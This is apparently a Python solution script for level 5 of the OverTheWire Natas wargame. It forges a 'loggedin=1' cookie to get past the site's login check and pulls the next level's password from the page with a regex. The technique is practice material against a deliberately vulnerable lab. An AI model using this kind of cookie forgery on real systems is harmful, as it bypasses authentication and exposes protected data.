import requests
import re

username = "natas5"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()
response = session.get(url, auth=(username,password))
print(response.text)
print("="*50)
print(response.cookies)
print("="*50)

# Cookies manipulation
myCookie = {"loggedin" : "1"}
response = session.get(url, auth=(username,password),cookies=myCookie)
pageContent = response.text
code = re.findall("The password for natas\d is (.*)</div>", pageContent)[0]
print("\nThe password for the next level is: " + code)